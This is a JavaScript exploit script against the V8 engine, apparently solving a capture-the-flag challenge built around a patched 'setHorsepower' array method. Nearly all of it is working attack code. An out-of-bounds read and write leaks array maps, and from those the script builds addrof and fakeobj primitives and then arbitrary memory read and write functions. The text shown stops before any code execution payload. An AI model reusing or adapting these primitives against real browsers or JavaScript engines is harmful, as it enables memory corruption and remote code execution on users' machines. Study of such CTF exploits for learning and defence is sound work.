/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function ftoi_hex(val) {
    return "0x" + ftoi(val).toString(16);
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

// var a = [1.1, 2.2, 3.3, 4.4];
// a.setHorsepower(10);

var editor = [1.1, 2.2, 3.3, 4.4];
let float_arr = [9.6, 9.6, 9.6];
var obj_arr = [6.9, 6.9, 6.9];
obj_arr[3] = {a: 1};
editor.setHorsepower(1000);
var editor_map = ftoi(editor[4]) & 0xffffffffn;
console.log("[+] Float array map: " + editor_map.toString(16));

let obj_arr_map_idx = 0;
// search for obj_arr
for (let i = 0; i < 100; i++) {
    let x1 = ftoi(editor[i]);
    let x2 = ftoi(editor[i + 1]);
    let x3 = ftoi(editor[i + 2]);
    if (x1 == ftoi(6.9) && x2 == ftoi(6.9) && x3 == ftoi(6.9)) {
        console.log("[+] Found obj_arr at index " + (i + 3));
        obj_arr_map_idx = i + 3;
        break;
    }
}
let obj_arr_map = ftoi(editor[obj_arr_map_idx]) & 0xffffffffn;
console.log("[+] Obj array map: " + obj_arr_map.toString(16));

// search for float_arr
let float_arr_map_idx = 0;
for (let i = 0; i < 100; i++) {
    let x1 = ftoi(editor[i]);
    let x2 = ftoi(editor[i + 1]);
    let x3 = ftoi(editor[i + 2]);
    if (x1 == ftoi(9.6) && x2 == ftoi(9.6) && x3 == ftoi(9.6)) {
        console.log("[+] Found float_arr at index " + (i + 3));
        float_arr_map_idx = i + 3;
        break;
    }
}
let float_arr_leak = ftoi(editor[float_arr_map_idx]);
let float_arr_map = float_arr_leak & 0xffffffffn;
let float_arr_prop = float_arr_leak >> 32n;
console.log("[+] Float array map: " + float_arr_map.toString(16));

function addrof(obj) {
    obj_arr[0] = obj;
    editor[obj_arr_map_idx] = itof(editor_map);
    let addr = ftoi(obj_arr[0]);
    // restore the original map
    editor[obj_arr_map_idx] = itof(obj_arr_map);
    return addr & 0xffffffffn;
}

function fakeobj(addr) {
    float_arr[0] = itof(addr);
    editor[float_arr_map_idx] = itof(obj_arr_map);
    let fake = float_arr[0];
    // console.log("Fake object at address: " + addrof(fake).toString(16) + " and req was " + addr.toString(16));
    // restore the original map
    editor[float_arr_map_idx] = itof(float_arr_map);
    return fake;
}

let arb_rw_arr = [itof(float_arr_leak), 2.2, 3.3, 4.4];
function arbread(addr) {
    // tag the pointer
    if (addr % 2n == 0) {
        addr += 1n;
    }
    let fake = fakeobj(addrof(arb_rw_arr) + 0x20n);
    arb_rw_arr[1] = itof((2n << 32n) + addr - 0x8n);
    console.log("Address of fake object: " + addrof(fake).toString(16));
    
    // %DebugPrint(fake);
    let ans = ftoi(fake[0]);
    arb_rw_arr[1] = 2.2;
    return ans;
}

function initial_arb_write(addr, val) {
    if (addr % 2n == 0) {
        addr += 1n;
    }
    let fake = fakeobj(addrof(arb_rw_arr) + 0x20n);
    arb_rw_arr[1] = itof((2n << 32n) + addr - 0x8n);
    fake[0] = itof(val);
}

// initial_arb_write(editor + 0x20, 0x696969n);